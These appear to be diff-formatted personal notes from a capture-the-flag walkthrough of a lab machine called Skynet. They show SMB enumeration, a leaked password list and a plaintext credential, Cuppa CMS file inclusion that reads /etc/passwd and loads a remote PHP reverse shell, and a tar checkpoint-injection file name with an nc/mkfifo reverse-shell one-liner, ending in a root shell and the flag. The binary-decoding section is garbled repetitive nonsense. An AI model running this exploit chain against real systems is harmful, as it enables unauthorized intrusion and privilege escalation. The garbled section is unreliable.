@@ -1,0 +1,162 @@
+└─$ nmap -A -p 22,80,110,139,143,445 10.10.6.88   --min-rate 5555
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 00:44 PDT
+Nmap scan report for 10.10.6.88
+Host is up (0.42s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
+|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
+|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Skynet
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: AUTH-RESP-CODE CAPA RESP-CODES UIDL SASL TOP PIPELINING
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: LOGIN-REFERRALS have Pre-login IDLE SASL-IR ENABLE IMAP4rev1 post-login listed capabilities LOGINDISABLEDA0001 ID OK more LITERAL+
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+
+
+//port 80
+http://10.10.6.88/squirrelmail/src/login.php
+
+└─$ netexec smb 10.10.6.88 -u 'guest' -p '' --users
+SMB         10.10.6.88      445    SKYNET           [*] Unix - Samba (name:SKYNET) (domain:) (signing:False) (SMBv1:True)
+SMB         10.10.6.88      445    SKYNET           [+] \guest: (Guest)
+SMB         10.10.6.88      445    SKYNET           -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         10.10.6.88      445    SKYNET           milesdyson                    2019-09-17 06:40:55 0
+SMB         10.10.6.88      445    SKYNET           [*] Enumerated 1 local users: SKYNET
+                                                                                                    
+┌──(ed㉿kali)-[~]
+└─$ netexec smb 10.10.6.88 -u 'guest' -p '' --shares
+SMB         10.10.6.88      445    SKYNET           [*] Unix - Samba (name:SKYNET) (domain:) (signing:False) (SMBv1:True)
+SMB         10.10.6.88      445    SKYNET           [+] \guest: (Guest)
+SMB         10.10.6.88      445    SKYNET           [*] Enumerated shares
+SMB         10.10.6.88      445    SKYNET           Share           Permissions     Remark
+SMB         10.10.6.88      445    SKYNET           -----           -----------     ------
+SMB         10.10.6.88      445    SKYNET           print$                          Printer Drivers
+SMB         10.10.6.88      445    SKYNET           anonymous       READ            Skynet Anonymous Share
+SMB         10.10.6.88      445    SKYNET           milesdyson                      Miles Dyson Personal Share
+SMB         10.10.6.88      445    SKYNET           IPC$                            IPC Service (skynet server (Samba, Ubuntu))
+
+
+smb: \logs\> more log1.txt
+
+cyborg007haloterminator   *
+terminator22596
+terminator219
+terminator20
+terminator1989
+terminator1988
+terminator168
+terminator16
+terminator143
+terminator13
+terminator123!@#
+terminator1056
+terminator101
+terminator10
+terminator02
+terminator00
+roboterminator
+pongterminator
+manasturcaluterminator
+exterminator95
+exterminator200
+dterminator
+djxterminator
+dexterminator
+determinator
+cyborg007haloterminator
+avsterminator
+alonsoterminator
+Walterminator
+79terminator6
+1996terminator
+
+
+//after login as milesdyson
+We have changed your smb password after system malfunction.
+Password: )s{A&2Z=F^n_E.B`
+
+    └─$ netexec smb 10.10.6.88 -u 'milesdyson' -p ')s{A&2Z=F^n_E.B`' --shares
+    SMB         10.10.6.88      445    SKYNET           [*] Unix - Samba (name:SKYNET) (domain:) (signing:False) (SMBv1:True)
+    SMB         10.10.6.88      445    SKYNET           [+] \milesdyson:)s{A&2Z=F^n_E.B` 
+    SMB         10.10.6.88      445    SKYNET           [*] Enumerated shares
+    SMB         10.10.6.88      445    SKYNET           Share           Permissions     Remark
+    SMB         10.10.6.88      445    SKYNET           -----           -----------     ------
+    SMB         10.10.6.88      445    SKYNET           print$          READ            Printer Drivers
+    SMB         10.10.6.88      445    SKYNET           anonymous       READ            Skynet Anonymous Share
+    SMB         10.10.6.88      445    SKYNET           milesdyson      READ            Miles Dyson Personal Share
+    SMB         10.10.6.88      445    SKYNET           IPC$                            IPC Service (skynet server (Samba, Ubuntu))
+    
+smbclient //10.10.6.88/milesdyson -U milesdyson
+
+smb: \notes\> more important.txt
+
+    1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+
+
+01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
+01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
+00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
+00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
+00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
+00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
+00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
+00100000 01110100 01101111
+
+//binary to text
+balls have zero to me to me to me to me to me to me to me to me to
+
+
+i can i i everything else . . . . . . . . . . . . . .
+balls have zero to me to me to me to me to me to me to me to me to
+you i everything else . . . . . . . . . . . . . .
+balls have a ball to me to me to me to me to me to me to me
+i i can i i i everything else . . . . . . . . . . . . . .
+balls have a ball to me to me to me to me to me to me to me
+i . . . . . . . . . . . . . . . . . . .
+balls have zero to me to me to me to me to me to me to me to me to
+you i i i i i everything else . . . . . . . . . . . . . .
+balls have 0 to me to me to me to me to me to me to me to me to
+you i i i everything else . . . . . . . . . . . . . .
+balls have zero to me to me to me to me to me to me to me to me to
+
+
+http://10.10.6.88/45kra24zxs28v3yd/administrator/
+//from this page we get cuppa is used
+
+Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion 
+
+http://10.10.6.88/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
+
+
+http://10.10.6.88/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.87.102:8821/php-reverse-shell.php
+
+
+www-data@skynet:/var/www/html$ echo "/var/www/html"  > "--checkpoint-action=exec=sh shell.sh"
+<ml$ echo "/var/www/html"  > "--checkpoint-action=exec=sh shell.sh"          
+www-data@skynet:/var/www/html$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.87.102 8821 > /tmp/f" > shell.sh
+< /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.87.102 8821 > /tmp/f" > shell.sh
+www-data@skynet:/var/www/html$ chmod +x shell.sh
+chmod +x shell.sh
+
+└─$ nc -nvlp 8821    
+listening on [any] 8821 ...
+connect to [10.13.87.102] from (UNKNOWN) [10.10.6.88] 55372
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+root.txt
+# cat root.txt
+3f0372db24753accc7179a282cd6a949
